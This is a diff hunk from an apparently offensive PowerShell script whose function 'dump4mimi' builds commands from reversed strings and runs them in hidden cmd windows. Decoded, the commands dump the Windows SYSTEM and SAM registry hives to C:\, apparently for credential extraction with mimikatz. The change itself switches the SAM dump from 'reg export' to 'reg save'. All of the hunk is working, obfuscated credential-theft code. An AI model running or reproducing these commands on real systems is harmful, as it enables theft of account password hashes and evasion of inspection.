@@ -88,7 +88,7 @@ function dump4mimi {
 	$ax3 = 'y/ "metsys\:C" "metsys\MLKH" tropxe ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
 	start-process cmd "/c $sp1k3 " -WindowStyle hidden
 	sleep(3.5)
-	$ax3 = 'y/ "mas\:C" "mas\MLKH" tropxe ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
+	$ax3 = 'y/ "mas\:C" "mas\MLKH" evas ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
 	start-process cmd "/c $sp1k3 " -WindowStyle hidden
 
     clear
